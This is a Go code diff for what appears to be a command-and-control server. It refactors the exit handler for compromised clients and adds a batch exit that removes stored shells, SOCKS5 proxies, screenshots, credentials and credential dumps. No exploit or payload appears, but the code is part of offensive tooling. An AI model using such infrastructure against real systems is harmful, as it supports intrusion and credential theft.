@@ -513,6 +513,43 @@ func FetchFileContent(c *gin.Context) {
 	}
 
 }
+func cleanupExitClient(uid string) {
+	var client database.Clients
+	database.Engine.Where("uid = ?", uid).Get(&client)
+	duration, _ := time.ParseDuration(client.Sleep + "s")
+	time.Sleep(duration)
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Clients))
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Downloads))
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Notes))
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Shell))
+	var socks5 []database.Socks5
+	database.Engine.Where("uid = ?", uid).Find(&socks5)
+	for _, socks5i := range socks5 {
+		if _, exists := proxy.Socks5Serve[socks5i.Socks5port]; exists {
+			err := proxy.Socks5Serve[socks5i.Socks5port].Close()
+			proxy.MuSocks5Serve.Lock()
+			delete(proxy.Socks5Serve, socks5i.Socks5port)
+			proxy.MuSocks5Serve.Unlock()
+			if err != nil {
+				logger.Errorf("Socks5 closed failed for uid: %s", uid)
+			}
+		}
+	}
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Socks5))
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Screenshots))
+	database.Engine.Where("uid = ?", uid).Delete(new(database.Credentials))
+	database.Engine.Where("uid = ?", uid).Delete(new(database.CredentialDumps))
+	screenshotDir := filepath.Join("Screenshots", uid)
+	if _, err := os.Stat(screenshotDir); err == nil {
+		os.RemoveAll(screenshotDir)
+	}
+	dumpDir := filepath.Join("Downloads", uid)
+	if _, err := os.Stat(dumpDir); err == nil {
+		os.RemoveAll(dumpDir)
+	}
+	delete(command.UidFileBrowser, uid)
+}
+
 func ExitClient(c *gin.Context) {
 	var clientBody struct {
 		Uid string `form:"uid"`
@@ -521,46 +558,23 @@ func ExitClient(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
 	}
 	sendcommand.SendCommand(clientBody.Uid, "exit")
-
-	go func() {
-		var client database.Clients
-		database.Engine.Where("uid = ?", clientBody.Uid).Get(&client)
-		duration, _ := time.ParseDuration(client.Sleep + "s")
-		time.Sleep(duration)
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Clients))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Downloads))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Notes))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Shell))
-		var socks5 []database.Socks5
-		database.Engine.Where("uid = ?", clientBody.Uid).Find(&socks5)
-		for _, socks5i := range socks5 {
-			if _, exists := proxy.Socks5Serve[socks5i.Socks5port]; exists {
-				err := proxy.Socks5Serve[socks5i.Socks5port].Close()
-				proxy.MuSocks5Serve.Lock()
-				delete(proxy.Socks5Serve, socks5i.Socks5port)
-				proxy.MuSocks5Serve.Unlock()
-				if err != nil {
-					c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Socks5 closed failed"})
-					return
-				}
-			}
-		}
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Socks5))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Screenshots))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.Credentials))
-		database.Engine.Where("uid = ?", clientBody.Uid).Delete(new(database.CredentialDumps))
-		screenshotDir := filepath.Join("Screenshots", clientBody.Uid)
-		if _, err := os.Stat(screenshotDir); err == nil {
-			os.RemoveAll(screenshotDir)
-		}
-		dumpDir := filepath.Join("Downloads", clientBody.Uid)
-		if _, err := os.Stat(dumpDir); err == nil {
-			os.RemoveAll(dumpDir)
-		}
-		delete(command.UidFileBrowser, clientBody.Uid)
-	}()
-
+	go cleanupExitClient(clientBody.Uid)
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
+
+func BatchExitClients(c *gin.Context) {
+	var clients []database.Clients
+	database.Engine.Find(&clients)
+	count := len(clients)
+	for _, client := range clients {
+		sendcommand.SendCommand(client.Uid, "exit")
+	}
+	go func() {
+		for _, client := range clients {
+			cleanupExitClient(client.Uid)
+		}
+	}()
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK, "count": count})
 }
 func AddUidNote(c *gin.Context) {
 	var noteBody struct {
